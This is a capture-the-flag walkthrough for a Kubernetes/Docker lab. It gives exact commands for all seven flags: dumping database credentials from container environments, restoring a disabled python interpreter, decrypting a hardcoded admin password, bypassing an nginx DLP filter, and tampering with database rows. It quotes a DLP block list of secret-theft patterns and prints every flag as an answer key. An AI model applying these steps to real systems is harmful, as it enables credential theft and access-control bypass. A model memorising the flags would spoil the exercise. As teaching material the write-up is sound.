# WRITEUP - Wizn't Day One (recreated)

This walks through all seven flags in solve order, with the exact commands
that work against this repo's `docker compose` setup. Swap `docker compose
exec X` for `kubectl -n challenge exec X --` if you're running the k8s
manifests instead - the *targets* differ (pods vs containers) but the
commands run inside them are identical.

Start everything and give postgres a few seconds to finish seeding:

```bash
docker compose up -d --build
docker compose logs postgres | tail -5   # wait for "database system is ready to accept connections"
```

---

## Challenge 1 - Account Not Found

**Story:** you have a shell with network access, `psql`, and `python3`.
Bonnie says start by exploring the database.

**The bug:** the app's database credentials are sitting in plain text in
its own environment variables - completely normal in most Kubernetes
setups (env vars are how you're *supposed* to inject config), but nobody
locked down who could read them via `kubectl exec` / `docker exec`.

```bash
docker compose exec app printenv | grep DATABASE_CONNECTION_STRING
# DATABASE_CONNECTION_STRING=postgresql://appuser:dbpassword123@postgres:5432/ctfapp

docker compose exec shell env PGPASSWORD=dbpassword123 \
  psql -h postgres -U appuser -d ctfapp -c "SELECT * FROM system_config;"
```

`system_config.debug_flag` is `FLAG{1_cl0ud_expl0rer_f0und_th3_db}`.

**Why it's there:** `debug_flag` with the description "remove in
production" is the oldest story in the book - a debug/diagnostic value
that made it into a seed script or migration and never got pulled back
out before shipping.

---

## Challenge 2 - Admin Access

**Story:** you found *a* password (the DB one), but logging into the app
itself as `admin` needs something else, and it's not in the database -
`users.password_hash` for `admin` is `NULL`.

**Step 1 - find where the admin password actually lives.** Reading the
app's own source (you have a shell in the same cluster; nothing stops you
from just `cat`-ing the app's code) shows `services/auth.py`:

```python
ENCRYPTED_ADMIN_PASSWORD = "gAAAAABpdzbFjN4YPqGNea2lBI7KyP9Vzi..."

def get_builtin_password():
    with open("/etc/secrets/encryption-key", "r") as f:
        passphrase = f.read().strip()
    key = base64.urlsafe_b64encode(hashlib.sha256(passphrase.encode()).digest())
    return Fernet(key).decrypt(ENCRYPTED_ADMIN_PASSWORD.encode()).decode()
```

The "encryption" key is mounted as a Kubernetes Secret at
`/etc/secrets/encryption-key` - inside the *same pod* that has the
ciphertext hardcoded in its source. Encrypting a secret with a key stored
right next to it protects against nothing; it only protects against
someone who can read the ciphertext but not the pod filesystem, which
isn't a threat model that survives contact with `kubectl exec`.

**Step 2 - the twist: `python3` is locked down.**

```bash
docker compose exec app python3 -c "print(1)"
# OCI runtime exec failed: exec: "python3": executable file not found in $PATH
```

The app's `entrypoint.sh` starts the app, waits 2 seconds, then does this:

```sh
python3 -c "
import os, glob
for p in glob.glob('/usr/local/bin/python*') + glob.glob('/usr/local/bin/pip*'):
    try: os.chmod(p, 0o000)
    except: pass
"
```

...on the theory that a python interpreter with no execute bit can't be
used to pop a shell. Two problems: `appuser` (the container's user) *owns*
those files (chowned in the Dockerfile), and file ownership - not the
current mode bits - is what governs whether you're allowed to `chmod` a
file back. Second: this alpine-based image ships busybox, which provides
its own `chmod` applet, so even though `chmod` isn't on `$PATH` as a
standalone binary, it's one call away:

```bash
docker compose exec app sh -c "busybox chmod +x /usr/local/bin/python3.11"
docker compose exec app python3 -c \
  "from app.services.auth import get_builtin_password; print(get_builtin_password())"
# FLAG{2_d3f4ult_cr3ds_n3v3r_ch4ng3d}
```

The decrypted string *is* the admin password **and** the flag - a wink at
"the credential you just cracked was never rotated since Derek set it up."

---

## Challenge 3 - Blocked

**Story:** you have the password. Logging in fails anyway.

```bash
curl -i -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FLAG{2_d3f4ult_cr3ds_n3v3r_ch4ng3d}"}'
# curl: (52) Empty reply from server
```

nginx just... hangs up. No HTTP status, no body - the connection gets
closed mid-handshake (`ngx.exit(444)` in nginx-speak). Something between
you and the app is inspecting the request body.

```bash
docker compose logs nginx | grep -i dlp
```

```
[dlp] DLP: Incident logged - FLAG{3_dlp_1s_bl0ck1ng_y0ur_fl4g}, client: ..., request: "POST /api/login HTTP/1.1", ..., matched_pattern: "FLAG{"
```

There's a Lua DLP filter in front of the app blocking any POST body that
contains something that looks like a leaked secret - and your password
*is* a `FLAG{...}` string, so it trips the filter. The bug: whoever wrote
this logging line hardcoded an *example* incident ID instead of
interpolating the actual matched value, and that example happens to be a
real flag. Reading your own infrastructure's logs is always worth doing.

---

## Challenge 4 - The One Thing That Works

**Story:** the DLP is the one thing Derek configured correctly. Find out
how it's configured.

```bash
docker compose exec nginx cat /etc/nginx/dlp-rules/patterns.json
```

```json
{
  "version": "1.0",
  "description": "Data Loss Prevention blocked patterns",
  "config_key": "FLAG{4_c0nf1g_m4st3r_f0und_th3_rul3s}",
  "blocked_patterns": ["FLAG{", "api_key=", "private_key", "BEGIN RSA", "aws_access_key"],
  ...
}
```

No exploit here, just "read the config of the thing that's blocking you"
- and notice the blocked-pattern list itself, because you'll need it in a
minute.

---

## Challenge 5 - Provision My Account

**Story:** you need the admin panel to create your own account, and you
now have the admin password - but every login attempt with it gets DLP-blocked
(challenge 3), and `credential-store`'s frontend page insists:

```bash
docker compose exec shell curl -s http://credential-store:8080/
# {"note":"This is an internal service. Access restricted by NetworkPolicy.", ...}
```

**Neither of those is really the wall.** The DLP filter only runs on the
path through nginx. Nothing about the cluster network stops you from
talking to the `app` Service directly - nginx is a proxy in front of it,
not the only way in:

```bash
docker compose exec shell python3 -c "
import urllib.request, json
data = json.dumps({'username':'admin','password':'FLAG{2_d3f4ult_cr3ds_n3v3r_ch4ng3d}'}).encode()
req = urllib.request.Request('http://app:8080/api/login', data=data,
                              headers={'Content-Type':'application/json'})
print(json.loads(urllib.request.urlopen(req).read())['session_id'])
"
```

Login succeeds - 200, a real session ID, no DLP in the way. That "Access
restricted by NetworkPolicy" note on `credential-store` is flavor text,
not an actual policy object; the real gate on `credential-store` is a
bearer-token check, and the `app` pod has a token that satisfies it (see
`app/app/services/auth.py`'s `hash_password_via_credential_store` -
it reads its own mounted service-account token and forwards it as
`Authorization: Bearer <token>`).

**Get an admin session, then a captcha token** (`/api/captcha/verify`
just signs a token for anyone with a valid session - the slider it's
supposedly gating never gets checked server-side), **then hit
`/api/credentials`:**

```bash
SID="<session_id from above>"
docker compose exec shell python3 -c "
import urllib.request, json
sid='$SID'
req = urllib.request.Request('http://app:8080/api/captcha/verify', data=b'{}',
    headers={'Authorization':'Bearer '+sid,'Content-Type':'application/json'}, method='POST')
tok = json.loads(urllib.request.urlopen(req).read())['token']
req2 = urllib.request.Request('http://app:8080/api/credentials',
    headers={'Authorization':'Bearer '+sid,'X-Captcha-Token':tok})
print(urllib.request.urlopen(req2).read().decode())
"
```

```json
{"credentials":[
  {"key":"partner_api_token","name":"DataSync Partners API Token","value":"FLAG{5_n3tw0rk_p0l1cy_byp4ss3d}"},
  {"key":"email_smtp_password", ...},
  {"key":"backup_service_key", ...}
], "message":"Credentials retrieved successfully."}
```

**Why it's called "network policy bypassed":** the whole DLP/"restricted"
framing implies network-level enforcement that doesn't exist. The
in-cluster path (browser → nginx → app, *or* shell → app directly) was
never actually different from a networking standpoint - only the request
body content differs, and DLP only inspects that on the nginx path.

Now provision your own account through the same admin session (needs a
fresh captcha token - they're single-use-ish by design, 5-minute expiry):

```bash
docker compose exec shell python3 -c "
import urllib.request, json
sid='$SID'
req = urllib.request.Request('http://app:8080/api/captcha/verify', data=b'{}',
    headers={'Authorization':'Bearer '+sid,'Content-Type':'application/json'}, method='POST')
tok = json.loads(urllib.request.urlopen(req).read())['token']
body = json.dumps({'username':'newhire','full_name':'New Hire','email':'newhire@wiznt.io'}).encode()
req2 = urllib.request.Request('http://app:8080/api/admin/create-account', data=body,
    headers={'Authorization':'Bearer '+sid,'X-Captcha-Token':tok,'Content-Type':'application/json'}, method='POST')
print(urllib.request.urlopen(req2).read().decode())
"
```

Save the `username`/`password` from the response - challenge 6 needs to
log in as this account.

---

## Challenge 6 - The Checklist

**Story:** OnBored tries to load your onboarding checklist. It crashes.

```bash
USID="<session_id from logging in as the account you just created>"
docker compose exec shell python3 -c "
import urllib.request
req = urllib.request.Request('http://app:8080/api/report',
    headers={'Authorization':'Bearer $USID'})
print(urllib.request.urlopen(req).read().decode())
"
```

This one's three stacked bugs.

**Bug 1 - `IncompleteModulesError`.** New accounts are copied five
onboarding modules, all `completed = false`. `generate_report()` refuses
to run until every module is marked complete - by design, but nothing in
the "provision an account" flow ever marks any of them done, so *every*
freshly-provisioned account is permanently locked out unless someone
manually flips the flags. Since your `appuser` DB role has write access
to `onboarding_modules`:

```bash
docker compose exec shell env PGPASSWORD=dbpassword123 psql -h postgres -U appuser -d ctfapp \
  -c "UPDATE onboarding_modules SET completed = true WHERE user_id = <your user_id>;"
```

**Bug 2 - a `NULL` blows up arithmetic.** Retry the report call:

```json
{"error":"Report generation failed","type":"TypeError",
 "traceback":"...total += value\nTypeError: unsupported operand type(s) for +=: 'int' and 'NoneType'"}
```

One row in `report_data` has `value = NULL`. The report code does
`total += value` with no null-check. Fix the data (you own this table too):

```bash
docker compose exec shell env PGPASSWORD=dbpassword123 psql -h postgres -U appuser -d ctfapp \
  -c "SELECT sequence, category, value, encoded_char FROM report_data WHERE value IS NULL;"
# sequence 13, category 'event', encoded_char 36
docker compose exec shell env PGPASSWORD=dbpassword123 psql -h postgres -U appuser -d ctfapp \
  -c "UPDATE report_data SET value = 0 WHERE sequence = 13;"
```

**Bug 3 - a wrong XOR key hides the flag in plain sight.** Retry once
more and you get a 200 with a `checksum` field... that's garbage:

```
"checksum": "FYAR{#_q4a4Jf$x&dJr&p%ra_b0gkf}"
```

Close to `FLAG{...}` but not quite - `F`, `A`, `{` line up; `Y`/`L` and
`R`/`G` don't. `app/app/services/reports.py` has:

```python
# TODO: Make sure the keys are correct
XOR_KEYS = [0x42, 0x0A]
...
key = XOR_KEYS[(sequence - 1) % len(XOR_KEYS)]
decoded_char = chr(encoded_char ^ key)
```

Every *odd*-sequence character decodes correctly (uses `0x42`); every
*even*-sequence character is wrong (uses `0x0A`). That's a single-byte
XOR - solvable by comparing one known-wrong output char against the
expected plaintext at the same position: `Y` (0x59) should be `L` (0x4C),
so the correct key is `0x59 ^ 0x4C ^ 0x0A = 0x1F`. Decode all 31 rows
with `[0x42, 0x1F]` instead:

```python
rows = [(1,4),(2,83),(3,3), ...]  # (sequence, encoded_char) from report_data
keys = [0x42, 0x1F]
print(''.join(chr(enc ^ keys[(seq-1) % 2]) for seq, enc in rows))
# FLAG{6_d4t4_f1x3d_r3p0rt_w0rks}
```

Or just fix the constant in the source and let the app do it for you -
either way, `FLAG{6_d4t4_f1x3d_r3p0rt_w0rks}`.

---

## Challenge 7 - Complete Onboarding

**Story:** the last onboarding step calls a "verification" job. It times
out. Every time.

```bash
docker compose exec shell python3 -c "
import urllib.request
req = urllib.request.Request('http://app:8080/api/audit/statistics',
    headers={'Authorization':'Bearer $SID'})  # admin session
print(urllib.request.urlopen(req).read().decode())
"
# {"flag":null,"status":"timeout","top_users":[],"total_bursts":null,"total_users":null}
```

The endpoint calls a Postgres function, `analyze_burst_activity()`, that:

1. Runs a correlated `EXISTS` subquery over `audit_logs` (150k rows) to
   find "burst" activity per user.
2. Reads a flag file (`/etc/secrets/checkpoint7-flag`) via `pg_read_file`
   - which requires superuser-level privilege the app's own DB role
   (`appuser`) doesn't have, but the function runs `SECURITY DEFINER` as
   its owner (`postgres`, a superuser), so it can.
3. Has a 2-second `statement_timeout`, set as a role-level default on
   `appuser` (`ALTER ROLE appuser SET statement_timeout = '2000'`) - not
   inside the function body. (A `SET`/`set_config` run *inside* a
   function has no effect on a statement that's already executing;
   Postgres arms the cancellation timer once, when the outer statement
   starts.)

Without an index on `(user_id, resource_type, timestamp)`, the
correlated subquery is effectively O(n²) and blows well past 2 seconds.
`appuser` owns `audit_logs` (check `\dt` in `psql` - everything else in
this schema is owned by `postgres`), so it's allowed to fix its own
table:

```bash
docker compose exec shell env PGPASSWORD=dbpassword123 psql -h postgres -U appuser -d ctfapp \
  -c "CREATE INDEX idx_audit_logs_burst ON audit_logs(user_id, resource_type, timestamp DESC);"
```

Retry the same request:

```json
{"status":"success","flag":"FLAG{7_1nd3x3s_m4k3_1t_f4st}", "total_users":50, "total_bursts":3224, ...}
```

**Why `SET`-inside-the-function didn't work (worth internalizing):**
Postgres's `statement_timeout` cancellation timer is armed once per
top-level statement, using whatever value is in effect *at that moment*.
A `SELECT * FROM analyze_burst_activity()` from the client is one
top-level statement; anything the function does internally - including
changing `statement_timeout` via `set_config(..., true)` - happens
*after* that timer was already armed with the old value, so it has zero
effect on the statement currently running. The only things that
reliably apply a timeout to "this function, every time it's called" are
a role-level default, a database-level default, or the *caller* issuing
a separate `SET statement_timeout = ...` before calling the function.
`ALTER FUNCTION ... SET statement_timeout` looks like it should work the
same way and doesn't, for the same underlying reason - it's still
scoped to "while this function is executing," and the timer's already
armed by the time that scope starts. This bit us while building this
recreation, which is exactly why it's worth knowing.

---

## Recap

| Flag | Value |
|---|---|
| 1 | `FLAG{1_cl0ud_expl0rer_f0und_th3_db}` |
| 2 | `FLAG{2_d3f4ult_cr3ds_n3v3r_ch4ng3d}` |
| 3 | `FLAG{3_dlp_1s_bl0ck1ng_y0ur_fl4g}` |
| 4 | `FLAG{4_c0nf1g_m4st3r_f0und_th3_rul3s}` |
| 5 | `FLAG{5_n3tw0rk_p0l1cy_byp4ss3d}` |
| 6 | `FLAG{6_d4t4_f1x3d_r3p0rt_w0rks}` |
| 7 | `FLAG{7_1nd3x3s_m4k3_1t_f4st}` |

The throughline across all seven: nothing here is a memory-corruption
exploit or a novel crypto attack. Every single bug is an everyday
mistake - a debug flag left in, a "hardening" script that didn't account
for file ownership, a log line with a hardcoded example, a misleading
error message standing in for real access control, incomplete business
logic validation, an off-by-one in a XOR key, and a missing database
index. That's what makes this genre of challenge worth doing: the skills
are "read the logs," "read the source," "check who owns what," and
"understand why the fix works," not "know a CVE."
